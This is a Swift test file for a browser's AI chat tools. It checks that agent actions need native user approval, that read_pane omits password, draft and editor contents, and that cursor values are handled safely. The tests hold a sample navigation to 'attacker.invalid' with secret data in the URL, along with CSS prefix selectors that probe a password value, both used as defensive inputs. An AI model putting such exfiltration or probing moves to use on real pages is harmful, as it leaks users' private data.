import AppKit
import AI
import BrowseCore
import Testing
import WebKit
@testable import Browse

@MainActor private final class SecurityFixture {
    let root = FileManager.default.temporaryDirectory.appendingPathComponent("AISecurity-\(UUID())")
    let store: BrowserStore
    let page = Page(address: "https://example.com/")
    let tab: BrowserTab
    let controller: PageController
    init() {
        _ = NSApplication.shared
        store = BrowserStore(sessionFile: root.appendingPathComponent("session.json"), persistentExtensions: false)
        tab = BrowserTab(title: "Security", pages: [page])
        store.session.workspaces = [Workspace(name: "Tabs", tabs: [tab])]
        store.session.selectedTab = tab.id
        controller = store.controller(for: page)
        controller.webView.frame = NSRect(x: 0, y: 0, width: 600, height: 400)
    }
    func load(_ html: String) async throws {
        controller.webView.loadHTMLString(html, baseURL: URL(string: page.address))
        for _ in 0..<200 {
            if controller.webView.url != nil && !controller.webView.isLoading { break }
            try await Task.sleep(for: .milliseconds(20))
        }
        #expect(!controller.webView.isLoading)
    }
    func clean() {
        store.stopWindow()
        try? FileManager.default.removeItem(at: root)
    }
}

// @lat: [[lat.md/tests/ai-tests#Action approval boundaries]]
@Test @MainActor func aiActionApprovalBoundaries() async throws {
    let fixture = SecurityFixture(); defer { fixture.clean() }
    try await fixture.load("<body><input id='field'><input id='secret' type='password' value='hidden-secret'><button id='send' onclick='this.textContent=\"Submitted\"'>Send</button></body>")
    var allow = false
    var proposals: [String] = []
    var duringApproval: (() async throws -> Void)?
    let domain = "AISecurity-\(UUID())"
    let defaults = UserDefaults(suiteName: domain)!
    defer { defaults.removePersistentDomain(forName: domain) }
    let settings = AISettings(defaults: defaults)
    let tools = PaneChatTools(store: fixture.store, tabID: fixture.tab.id, settings: settings, approve: { details, _ in
        proposals.append(details)
        try? await duringApproval?()
        return allow
    })
    let id = fixture.page.id.uuidString
    _ = try await tools.execute("read_pane", input: .init(pane: id))
    // Attribute probes must fail identically before they query the DOM, rather
    // than exposing secret form values one prefix at a time through tool errors.
    var probeErrors: [String] = []
    for selector in ["#secret[value^='h']", "#secret[value^='x']", "body"] {
        do {
            _ = try await tools.execute("fill_element", input: .init(pane: id, selector: selector, text: "probe"))
            Issue.record("Unobserved selector was accepted")
        } catch { probeErrors.append(error.localizedDescription) }
    }
    #expect(Set(probeErrors).count == 1 && proposals.isEmpty)
    for (name, input) in [
        ("navigate_pane", PaneChatTools.Input(pane: id, url: "https://attacker.invalid/?data=secret")),
        ("click_element", .init(pane: id, selector: "#send")),
        ("fill_element", .init(pane: id, selector: "#field", text: "secret"))
    ] {
        await #expect(throws: Error.self) { try await tools.execute(name, input: input) }
    }
    #expect(proposals.count == 3)
    #expect(proposals[0].contains("attacker.invalid") && proposals[2].contains("secret"))
    #expect(fixture.controller.webView.url?.host == "example.com")
    #expect(try await fixture.controller.webView.evaluateJavaScript("document.querySelector('#field').value") as? String == "")
    #expect(try await fixture.controller.webView.evaluateJavaScript("document.querySelector('#send').textContent") as? String == "Send")
    allow = true
    _ = try await tools.execute("fill_element", input: .init(pane: id, selector: "#field", text: "approved"))
    #expect(try await fixture.controller.webView.evaluateJavaScript("document.querySelector('#field').value") as? String == "approved")
    duringApproval = { _ = try await fixture.controller.webView.evaluateJavaScript("document.querySelector('#send').outerHTML='<button id=send>Replaced</button>'") }
    await #expect(throws: Error.self) { try await tools.execute("click_element", input: .init(pane: id, selector: "#send")) }
    duringApproval = { settings.setToolEnabled("fill_element", enabled: false) }
    await #expect(throws: Error.self) { try await tools.execute("fill_element", input: .init(pane: id, selector: "#field", text: "denied")) }
    settings.setToolEnabled("fill_element", enabled: true)
    duringApproval = { fixture.controller.webView(fixture.controller.webView, didStartProvisionalNavigation: nil) }
    await #expect(throws: Error.self) { try await tools.execute("fill_element", input: .init(pane: id, selector: "#field", text: "stale")) }
    duringApproval = nil
    // Production approval cannot silently allow actions without a visible native window.
    let unattended = PaneChatTools(store: fixture.store, tabID: fixture.tab.id, settings: settings)
    await #expect(throws: Error.self) { try await unattended.execute("click_element", input: .init(pane: id, selector: "#field")) }
    duringApproval = { fixture.store.session.workspaces[0].tabs[0].pages = [Page()] }
    await #expect(throws: Error.self) { try await tools.execute("navigate_pane", input: .init(pane: id, url: "https://attacker.invalid")) }
}

@MainActor private final class ApprovalWindow: NSWindow {
    override var isKeyWindow: Bool { true }
}

// @lat: [[lat.md/tests/ai-tests#Native action confirmation]]
@Test @MainActor func aiNativeActionConfirmation() async throws {
    _ = NSApplication.shared
    let window = ApprovalWindow(contentRect: NSRect(x: -10000, y: -10000, width: 600, height: 400),
                                styleMask: [.titled, .closable], backing: .buffered, defer: false)
    window.isReleasedWhenClosed = false
    defer { window.close() }
    let web = WKWebView(frame: NSRect(x: 0, y: 0, width: 600, height: 400))
    window.contentView = web
    window.orderFront(nil)
    var completion: ((NSApplication.ModalResponse) -> Void)?
    var alert: NSAlert?
    let approval = AIActionApproval(present: { shown, _, callback in alert = shown; completion = callback })
    let denied = Task { await approval.request("Exact action", in: web) }
    for _ in 0..<100 where completion == nil { try await Task.sleep(for: .milliseconds(10)) }
    #expect(alert?.buttons.map(\.title) == ["Cancel", "Allow Once"])
    #expect(alert?.buttons.first?.keyEquivalent == "\r")
    completion?(.alertFirstButtonReturn)
    #expect(await denied.value == false)
    completion = nil
    let accepted = Task { await approval.request("Exact action", in: web) }
    for _ in 0..<100 where completion == nil { try await Task.sleep(for: .milliseconds(10)) }
    completion?(.alertSecondButtonReturn)
    #expect(await accepted.value)
    completion = nil
    let cancelled = Task { await approval.request("Exact action", in: web) }
    for _ in 0..<100 where completion == nil { try await Task.sleep(for: .milliseconds(10)) }
    cancelled.cancel()
    #expect(await cancelled.value == false)
    completion?(.alertSecondButtonReturn) // A late UI response cannot resume a cancelled tool.
    completion = nil
    let closed = Task { await approval.request("Exact action", in: web) }
    for _ in 0..<100 where completion == nil { try await Task.sleep(for: .milliseconds(10)) }
    window.close()
    #expect(await closed.value == false)
}

// @lat: [[lat.md/tests/ai-tests#Page read field privacy]]
@Test @MainActor func aiPageReadFieldPrivacy() async throws {
    let fixture = SecurityFixture(); defer { fixture.clean() }
    try await fixture.load("""
    <body><h1>Public article</h1><section id='container'>Public context
    <textarea id='draft'>private-draft</textarea>
    <div contenteditable='true' id='editor'><b>private-editor</b></div>
    <input id='password' type='password' value='private-password'>
    <select id='account'><option>private-option</option></select></section></body>
    """)
    let tools = PaneChatTools(store: fixture.store, tabID: fixture.tab.id)
    let result = try await tools.execute("read_pane", input: .init(pane: fixture.page.id.uuidString))
    let json = try result.jsonString()
    #expect(json.contains("Public article") && json.contains("Public context"))
    #expect(!json.contains("private-"))
    // Reading must leave the real page untouched, including editor contents.
    #expect(try await fixture.controller.webView.evaluateJavaScript("document.querySelector('#draft').value") as? String == "private-draft")
    #expect(try await fixture.controller.webView.evaluateJavaScript("document.querySelector('#editor').textContent") as? String == "private-editor")
}

// @lat: [[lat.md/tests/ai-tests#Untrusted read cursor presentation]]
@Test @MainActor func aiUntrustedReadCursorPresentation() throws {
    let fixture = SecurityFixture(); defer { fixture.clean() }
    let chat = TabChat(store: fixture.store, tabID: fixture.tab.id)
    for suffix in [String(Int.max), String(Int.min), "-1", "999999999999999999999999", "invalid"] {
        let cursor = UUID().uuidString + ":" + suffix
        let arguments = try JSONValue.object(["cursor": .string(cursor)]).jsonString()
        chat.consume(.toolCall(ToolCall(id: UUID().uuidString, name: "read_pane", arguments: arguments)))
        #expect(chat.bubbles.last?.argumentSummary == "part 1")
        #expect(chat.argumentFields(arguments).first?.value == "Next part")
    }
    #expect(TabChat.readPart(UUID().uuidString + ":0") == 1)
}
